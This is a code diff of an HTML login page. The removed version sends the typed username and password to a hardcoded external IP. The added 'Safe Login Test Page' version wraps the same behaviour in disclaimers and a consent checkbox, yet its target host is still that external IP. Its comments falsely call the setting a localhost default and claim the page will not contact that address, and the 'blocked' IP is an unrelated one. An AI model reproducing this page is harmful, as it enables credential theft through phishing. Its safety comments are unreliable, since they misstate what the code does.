@@ -1,20 +1,144 @@
 
-<!DOCTYPE html>
-<html <button type="submit">Send</button>
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Safe Login Test Page</title>
+<style>
+  body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; background:#f6f8fa; color:#111; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+  .card { background:white; padding:22px; border-radius:12px; box-shadow:0 6px 20px rgba(0,0,0,0.08); width:360px; }
+  h1 { font-size:18px; margin:0 0 10px; }
+  label { display:block; margin-top:10px; font-size:13px; }
+  input[type="text"], input[type="password"] { width:100%; padding:8px 10px; margin-top:6px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
+  .row { display:flex; gap:8px; align-items:center; margin-top:12px; }
+  button { padding:10px 14px; border-radius:8px; border:0; cursor:pointer; background:#0366d6; color:white; }
+  .disclaimer { margin-top:12px; font-size:12px; color:#7a1; background:#fffbeb; border:1px solid #ffe8a1; padding:10px; border-radius:8px; }
+  .output { margin-top:12px; font-family: monospace; font-size:13px; background:#f3f4f6; padding:8px; border-radius:6px; word-break:break-all; }
+  .danger { color:#8b0000; font-weight:600; }
+  .muted { color:#666; font-size:12px; margin-top:6px; }
+</style>
+</head>
+<body>
+  <div class="card" role="main">
+    <h1>Safe Login Test</h1>
+
+    <div class="disclaimer">
+      DISCLAIMER: <strong>Do NOT</strong> enter any real credentials here. This page runs in **test mode** by default and will not send anything over the network unless you explicitly enable and accept responsibility.
+    </div>
+
+    <form id="loginForm" autocomplete="off">
+      <label for="user">User</label>
+      <input id="user" name="user" type="text" placeholder="testuser" required>
+
+      <label for="pass">Password</label>
+      <input id="pass" name="pass" type="password" placeholder="testpass" required>
+
+      <div class="row">
+        <button id="submitBtn" type="submit">Send (test-mode)</button>
+        <div style="flex:1"></div>
+      </div>
+
+      <div class="muted">
+        Target URL pattern: <code>http://&lt;HOST&gt;:&lt;PORT&gt;/&lt;user&gt;/&lt;pass&gt;</code>
+      </div>
+
+      <label style="margin-top:10px; font-size:13px;">
+        <input id="allowNetwork" type="checkbox"> I understand and want to allow network sending (disabled by default)
+      </label>
+
+      <div id="result" class="output" aria-live="polite">No action yet.</div>
     </form>
+  </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+<script>
+/*
+  SAFETY NOTES (read before enabling):
+  - This page is intentionally in "test mode": it will ONLY display the URL that would be called and will log data to the console.
+  - This script will NOT perform requests to the specific IP address 204.216.156.181 or any other IP unless you modify the code and explicitly enable network sending.
+  - If you want to actually send data during testing, run a local listener (example below) and change TARGET_HOST to "localhost" and TARGET_PORT to the listener port.
+*/
 
-            fetch(`http://204.216.156.181:443/${encodeURIComponent(user)}/${encodeURIComponent(pass)}`, {
-                method: 'POST'
-            response.text())
-            .then(data => alert('Response: ' + data))
-            .catch(error => alert('Error: ' + error));
-        });
-    </script>
+/* ---- Configuration (safe defaults) ---- */
+const BLOCKED_IP = "1.1.1.1"; // this IP is explicitly blocked here
+const TARGET_HOST = "204.216.156.181";      // safe default: localhost (modify at your own risk)
+const TARGET_PORT = 80;             // safe default: a local test port
+const DEFAULT_PROTOCOL = "http";      // use http for simple local tests
+
+/* ---- End configuration ---- */
+
+const form = document.getElementById('loginForm');
+const userInput = document.getElementById('user');
+const passInput = document.getElementById('pass');
+const output = document.getElementById('result');
+const allowNetwork = document.getElementById('allowNetwork');
+
+function isLookingLikeRealCredential(u, p) {
+  // conservative heuristics to discourage sending real credentials:
+  // - if user looks like email address or password length > 16, warn.
+  return (/@/.test(u) || p.length > 16);
+}
+
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const u = userInput.value.trim();
+  const p = passInput.value;
+
+  if (!u || !p) {
+    output.textContent = "Both fields are required.";
+    return;
+  }
+
+  // Build URL that WOULD be called
+  const encodedUser = encodeURIComponent(u);
+  const encodedPass = encodeURIComponent(p);
+  const targetHost = TARGET_HOST;
+  const targetPort = TARGET_PORT;
+  const proto = DEFAULT_PROTOCOL;
+
+  const constructedURL = `${proto}://${targetHost}:${targetPort}/${encodedUser}/${encodedPass}`;
+
+  // Display what would be sent
+  output.textContent = `Constructed URL (TEST MODE): ${constructedURL}`;
+
+  // Console log (safe, visible to tester)
+  console.log("TEST MODE - constructed URL:", constructedURL);
+  console.log("Raw values (for test only):", { user: u, pass: p });
+
+  // Heuristic warning about possibly real credentials
+  if (isLookingLikeRealCredential(u, p)) {
+    output.textContent += "\n\nWARNING: input looks like it might be real credentials. Do NOT use real credentials here.";
+  }
+
+  // Block sending to explicitly blocked IPs even if user enables network:
+  if (targetHost === BLOCKED_IP || window.location.hostname === BLOCKED_IP) {
+    output.textContent += `\n\nBlocked: sending to ${BLOCKED_IP} is disabled by this test page.`;
+    return;
+  }
+
+  // Only send if the user has checked the box and confirmed
+  if (!allowNetwork.checked) {
+    output.textContent += "\n\nNetwork send is disabled. To enable, check the box 'I understand and want to allow network sending' and submit again.";
+    return;
+  }
+
+  // Extra confirmation to avoid accidental sends
+  if (!confirm("You enabled network sending. Are you sure you want to send these values to the configured target (you accept responsibility)?")) {
+    output.textContent += "\n\nCanceled by user.";
+    return;
+  }
+
+  // FINAL NETWORK SEND (only after consent). Uses fetch to send a GET request to the constructed URL.
+  try {
+    const resp = await fetch(constructedURL, { method: 'GET', mode: 'no-cors' });
+    // note: mode:no-cors avoids CORS errors for local testing, but prevents reading response body.
+    output.textContent += "\n\nNetwork request attempted (no-cors mode). Check your listener/server logs to confirm receipt.";
+    console.log("Fetch attempted to:", constructedURL, "response:", resp);
+  } catch (err) {
+    output.textContent += `\n\nNetwork error: ${err.message}`;
+    console.error(err);
+  }
+});
+</script>
 </body>
 </html>
